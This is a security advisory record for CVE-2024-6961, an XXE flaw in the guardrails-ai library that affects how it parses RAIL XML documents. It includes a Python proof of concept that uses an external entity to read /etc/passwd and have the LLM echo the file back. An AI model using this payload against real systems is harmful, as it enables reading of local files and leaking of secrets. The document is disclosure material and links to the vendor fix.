{"hash":"86497c09bdb478776d37c561344cb926afd29421","data":{"post":{"title":"Guardrails RAIL XXE","path":"/vulnerabilities/guardrails-rail-xxe-jfsa-2024-001035519/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>XXE in Guardrails AI when consuming RAIL documents</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>guardrails-ai</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,0.5.0)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>RAIL documents are an XML-based format invented by Guardrails AI to enforce formatting checks on LLM outputs. Guardrails users that consume RAIL documents from external sources are vulnerable to XXE, which may cause leakage of internal file data via the SYSTEM entity.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-python\">import anthropic\nimport guardrails as gd\nfrom litellm import litellm\nimport os \n\nos.environ[\"ANTHROPIC_API_KEY\"] = \"put_here_your_secret_api_key\"\nAPI_KEY = os.environ[\"ANTHROPIC_API_KEY\"]\n\n## Assuming this RAIL document comes from an attacker\nrail_str = \"\"\"\n&#x3C;!--?xml version=\"0.1\" ?-->\n&#x3C;!DOCTYPE replace [&#x3C;!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n&#x3C;rail version=\"0.1\">\n\n&#x3C;output type=\"string\" >\n&#x3C;/output>\n\n&#x3C;prompt>\njust write back what appears down here:\n&#x26;xxe;\n&#x3C;/prompt>\n&#x3C;/rail>\n\"\"\"\n\n## Call the vulnerable API\nguard = gd.Guard.from_rail_string(rail_str)\n\nllm_output_unfiltered, validated_output, *rest = guard(\n  llm_api=litellm.completion,\n  model=\"claude-3-opus-20240229\"\n)\n\n## The validated_output will contain the contents of /etc/passwd\nprint(validated_output)\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/guardrails-ai/guardrails/pull/922\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vendor fix</a></p>\n","description":"CVE-2024-6961, MEDIUM, Guardrails RAIL XXE","date_published":"2024-07-21","xray_id":"JFSA-2024-001035519","vul_id":"CVE-2024-6961","severity":"medium","discovered_by":"Natan Nehorai","last_updated":"2024-07-21","cvss":5.9}},"context":{}}